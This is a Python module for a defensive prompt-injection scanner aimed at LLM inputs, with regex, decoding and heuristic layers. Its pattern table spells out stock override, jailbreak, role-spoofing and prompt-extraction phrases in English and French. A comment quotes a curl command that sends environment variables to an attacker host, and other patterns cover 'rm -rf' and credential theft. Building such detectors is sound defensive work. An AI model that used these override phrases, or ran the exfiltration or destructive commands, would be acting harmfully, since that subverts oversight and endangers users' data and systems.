"""
Prompt Injection Scanner — Multi-layer detection for LLM inputs.

Layers:
    1. Regex: well-known injection phrasings and jailbreaks
    2. Decode: detect and decode base64/hex/zero-width obfuscation
    3. Classifier: lightweight heuristic scoring

The scanner is intentionally dependency-free and deterministic so it can
be embedded in any Python runner without external model downloads.
"""

from __future__ import annotations

import base64
import binascii
import html
import re
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum


class ThreatLevel(str, Enum):
    SAFE = "safe"
    SUSPECT = "suspect"
    BLOCKED = "blocked"


@dataclass
class ScanFinding:
    layer: str  # "regex" | "classifier" | "decode"
    description: str
    severity: str  # "low" | "medium" | "high" | "critical"
    confidence: float  # 0.0 - 1.0


@dataclass
class ScanResult:
    threat_level: ThreatLevel
    findings: list[ScanFinding] = field(default_factory=list)
    scanned_text: str = ""
    source: str = ""
    decoded_content: str = ""
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


_INJECTION_PATTERNS: list[tuple[str, str, str]] = [
    (
        r"ignore (?:all |previous |above |the )+instructions",
        "Direct instruction override attempt",
        "critical",
    ),
    (
        r"disregard\s+(?:all\s+|any\s+)?(?:earlier\s+|prior\s+|previous\s+|the\s+)?"
        r"(?:rules|instructions|system|directives)",
        "Instruction disregard attempt",
        "critical",
    ),
    (
        r"you are now (?:a |an |the )?(?:different|new|unrestricted|DAN\b)",
        "Role reassignment attempt",
        "high",
    ),
    (
        r"(?:system|assistant)\s*[:>]",
        "System/assistant role spoofing marker",
        "high",
    ),
    (
        r"<\s*/?\s*(?:system|assistant|user)\s*>",
        "XML-style role injection",
        "high",
    ),
    (
        r"reveal (?:the |your )?(?:system )?prompt",
        "Prompt extraction attempt",
        "high",
    ),
    (
        r"print (?:the |your )?(?:initial |system )?prompt",
        "Prompt extraction attempt",
        "high",
    ),
    (
        r"developer mode|jailbreak|DAN mode",
        "Jailbreak trigger phrase",
        "critical",
    ),
    (
        r"execute\s+(?:shell|system|os|subprocess)",
        "Shell execution attempt",
        "critical",
    ),
    (
        r"\beval\s*\(|\bexec\s*\(",
        "Code execution primitive",
        "high",
    ),
    (
        r"(?:rm\s+-rf|del\s+/[fs])",
        "Destructive shell command",
        "critical",
    ),
    (
        r"(?:aws|api)[-_ ]?(?:key|token|secret)",
        "Credential exfiltration request",
        "medium",
    ),
    # --- merged in from the former `security/injection_patterns.py` ---------
    #
    # That module was a second catalogue with no production caller, and the
    # two were not redundant: each carried detections the other lacked. The
    # entries below are the ones this table was missing. What is *not* below
    # was already covered here — `<system>` by the XML-style rule, `DAN mode`
    # and developer mode by the jailbreak rule, `reveal/print prompt` by the
    # two extraction rules — so porting them would only have doubled findings
    # on one hit.
    #
    # Two were tightened on the way, because a pattern that fires on ordinary
    # text is a pattern that teaches people to ignore the ledger:
    #
    #   `DAN\s*(mode)?` as critical      -> dropped; unanchored `DAN` matches
    #                                       inside "DANGEREUX", and `DAN mode`
    #                                       is already in the jailbreak rule
    #   `Human:|Assistant:|System:`      -> `Human` only; the other two are
    #                                       already the role-spoofing rule
    (
        r"forget\s+(?:everything|all|what)\s+(?:you|I)\s+",
        "Memory reset attempt",
        "high",
    ),
    (
        r"(?:^|[.!?:]\s+|\byou\s+(?:must\s+|should\s+|will\s+|can\s+)?)"
        r"act\s+as\s+(?:a|an|if)\b",
        "Role injection",
        "medium",
    ),
    (
        r"pretend\s+(?:to\s+be|you\s+are)",
        "Persona injection",
        "high",
    ),
    (
        r"(?:show|output|display)\s+(?:me\s+)?"
        r"(?:your\s+(?:system\s+)?(?:prompt|instructions|rules)|the\s+system\s+prompt)\b",
        "System prompt extraction",
        "critical",
    ),
    (
        r"what\s+(?:are|is)\s+your\s+(?:system\s+)?(?:prompt|instructions|rules)",
        "System prompt query",
        "high",
    ),
    (
        r"repeat\s+(?:the\s+)?(?:text|words|instructions)\s+above",
        "Context extraction",
        "high",
    ),
    (
        r"<\s*/?\s*instructions?\s*>",
        "XML instruction tag injection",
        "critical",
    ),
    (
        r"\[INST\]|\[/INST\]",
        "Llama instruction tag injection",
        "critical",
    ),
    (
        # Pipe-style role tags, of which ChatML's `<|im_start|>` is one
        # dialect and `<|system|>` another. Written as one rule because the
        # families differ only in the word between the pipes, and a table
        # with one entry per vendor's delimiter is a table that is missing
        # the next vendor's.
        r"<\|\s*/?\s*(?:im_start|im_end|system|assistant|user|end)\s*\|>",
        "Pipe-style role tag injection",
        "critical",
    ),
    (
        # `curl http://attacker/$(env | base64)` — the payload is not the
        # command, it is the substitution that fills its URL. Anchored on the
        # readers of secrets rather than on `$(`, which is ordinary in a bug
        # report that quotes a shell line.
        r"\$\(\s*(?:env|printenv|whoami|id)\b|\$\(\s*cat\s+(?:/etc/|~?/\.)",
        "Environment exfiltration via command substitution",
        "high",
    ),
    (
        r"\bHuman\s*[:>]",
        "Conversation role injection",
        "high",
    ),
    (
        r"(?:aWdub3Jl|aWdub3JlIGFsbCBw)",
        "Base64-encoded injection",
        "high",
    ),
    # French. The product ships in FR and EN, and an issue written in French
    # was reaching this table with only its English half covered.
    (
        r"ignore[rz]?\s+(?:toutes?\s+)?(?:les\s+)?instructions?\s+pr[e\u00e9]c[e\u00e9]dentes?",
        "French instruction override",
        "high",
    ),
    (
        r"oublie[rz]?\s+tout\s+ce\s+qui",
        "French memory reset",
        "high",
    ),
    (
        r"tu\s+es\s+maintenant\s+(?:un|une)",
        "French role reassignment",
        "high",
    ),
]

_ZERO_WIDTH = re.compile(r"[\u200b-\u200f\u202a-\u202e\ufeff]")
_BASE64_HINT = re.compile(r"(?:^|[^A-Za-z0-9+/])([A-Za-z0-9+/]{24,}={0,2})")
_HEX_HINT = re.compile(r"\\x[0-9a-fA-F]{2}")


class InjectionScanner:
    """Deterministic multi-layer prompt injection scanner."""

    def __init__(
        self,
        block_threshold: float = 0.8,
        suspect_threshold: float = 0.4,
    ) -> None:
        self._block_threshold = block_threshold
        self._suspect_threshold = suspect_threshold
        self._compiled = [
            (re.compile(pat, re.IGNORECASE), desc, sev)
            for pat, desc, sev in _INJECTION_PATTERNS
        ]

    def scan(self, text: str, source: str = "unknown") -> ScanResult:
        result = ScanResult(
            threat_level=ThreatLevel.SAFE,
            scanned_text=text,
            source=source,
        )

        # Layer 2: decode first so regex can also see decoded content
        decoded = self._decode_obfuscation(text, result)
        result.decoded_content = decoded
        combined = f"{text}\n{decoded}" if decoded and decoded != text else text

        # Layer 1: regex
        for pattern, description, severity in self._compiled:
            if pattern.search(combined):
                result.findings.append(
                    ScanFinding(
                        layer="regex",
                        description=description,
                        severity=severity,
                        confidence=0.9 if severity == "critical" else 0.75,
                    )
                )

        # Layer 3: heuristic classifier
        self._heuristic_score(combined, result)

        result.threat_level = self._aggregate_level(result.findings)
        return result

    def _decode_obfuscation(self, text: str, result: ScanResult) -> str:
        pieces: list[str] = []

        if _ZERO_WIDTH.search(text):
            result.findings.append(
                ScanFinding(
                    layer="decode",
                    description="Zero-width unicode characters detected",
                    severity="medium",
                    confidence=0.6,
                )
            )
            pieces.append(_ZERO_WIDTH.sub("", text))

        for match in _BASE64_HINT.finditer(text):
            candidate = match.group(1)
            try:
                decoded_bytes = base64.b64decode(candidate, validate=True)
                decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                if decoded_str.isprintable() and len(decoded_str) >= 8:
                    result.findings.append(
                        ScanFinding(
                            layer="decode",
                            description="Base64-encoded payload decoded",
                            severity="medium",
                            confidence=0.3,
                        )
                    )
                    pieces.append(decoded_str)
            except (binascii.Error, ValueError):
                continue

        if _HEX_HINT.search(text):
            result.findings.append(
                ScanFinding(
                    layer="decode",
                    description="Hex-escaped bytes detected",
                    severity="low",
                    confidence=0.3,
                )
            )

        # URL and HTML-entity decoding, merged in from the former
        # `security/injection_scanner.py`. Both are how an injection reaches a
        # model through a channel that renders before it stores: an issue body
        # pasted from a URL keeps its `%20`s, and a comment posted through an
        # API that escapes on the way in arrives as `&lt;system&gt;`. The
        # patterns above only match the decoded form.
        #
        # Reported rather than only re-scanned, because encoding is itself the
        # signal: nobody writes `&lt;system&gt;` in a bug report by accident.
        url_decoded = urllib.parse.unquote(text)
        if url_decoded != text:
            result.findings.append(
                ScanFinding(
                    layer="decode",
                    description="URL-encoded content decoded",
                    severity="low",
                    confidence=0.3,
                )
            )
            pieces.append(url_decoded)

        html_decoded = html.unescape(text)
        if html_decoded != text:
            result.findings.append(
                ScanFinding(
                    layer="decode",
                    description="HTML-escaped content decoded",
                    severity="low",
                    confidence=0.3,
                )
            )
            pieces.append(html_decoded)

        return "\n".join(pieces) if pieces else ""

    def _heuristic_score(self, text: str, result: ScanResult) -> None:
        lowered = text.lower()
        suspicious_tokens = [
            "override",
            "bypass",
            "forbidden",
            "confidential",
            "do not refuse",
            "simulate",
            "roleplay",
            "without restriction",
        ]
        hits = sum(1 for t in suspicious_tokens if t in lowered)
        if hits >= 2:
            result.findings.append(
                ScanFinding(
                    layer="classifier",
                    description=f"Heuristic classifier flagged {hits} suspicious tokens",
                    severity="medium" if hits < 4 else "high",
                    confidence=min(0.3 + 0.15 * hits, 0.9),
                )
            )

    def _aggregate_level(self, findings: list[ScanFinding]) -> ThreatLevel:
        if not findings:
            return ThreatLevel.SAFE
        max_conf = max(f.confidence for f in findings)
        has_critical = any(f.severity == "critical" for f in findings)
        if has_critical or max_conf >= self._block_threshold:
            return ThreatLevel.BLOCKED
        if max_conf >= self._suspect_threshold:
            return ThreatLevel.SUSPECT
        return ThreatLevel.SAFE
